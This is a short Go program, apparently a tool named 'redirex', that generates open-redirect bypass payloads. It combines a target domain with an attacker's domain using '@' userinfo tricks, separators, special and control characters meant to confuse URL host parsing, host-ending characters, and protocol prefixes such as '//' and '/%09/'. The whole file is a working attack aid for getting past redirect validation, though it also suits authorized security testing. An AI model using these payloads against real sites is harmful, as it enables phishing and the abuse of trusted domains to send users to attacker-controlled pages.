package main

import (
	"fmt"
	"os"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("redirex target.com malicious.com")
		return
	}
	legit := os.Args[1]
	malicious := os.Args[2]

	//seperators between legit and malicious
	seperators := []string{".", "@"}
	//chars allowed in subdomaisn which might confuse parsers to think the host part ended (many only work in Safari)
	subdomainchars := []string{",", "&", "'", "\"", ";", "!", "$", "^", "*", "(", ")", "+", "`", "~", "-", "_", "=", "|", "{", "}", "%", "%01", "%02", "%03", "%04", "%05", "%06", "%07", "%08", "%0b", "%0c", "%0e", "%0f", "%10", "%11", "%12", "%13", "%14", "%15", "%16", "%17", "%18", "%19", "%1a", "%1b", "%1c", "%1d", "%1e", "%1f", "%7f"}
	//chars that end the host part
	endhostchars := []string{"/", "?", "\\", "#"}
	//different ways to start a url
	protocols := []string{"https://", "//", "/%09/", "/\\"}

	for _, seperator := range seperators {
		fmt.Println(seperator + malicious)
	}

	domaincombos := []string{malicious, legit + ":443@" + malicious}
	for _, seperator := range seperators {
		domaincombos = append(domaincombos, legit+seperator+malicious)
	}
	for _, char := range subdomainchars {
		domaincombos = append(domaincombos, legit+char+"."+malicious)
	}
	for _, char := range endhostchars {
		domaincombos = append(domaincombos, malicious+char+legit)
	}
	for _, domain := range domaincombos {
		for _, protocol := range protocols {
			fmt.Println(protocol + domain)
		}
	}
}
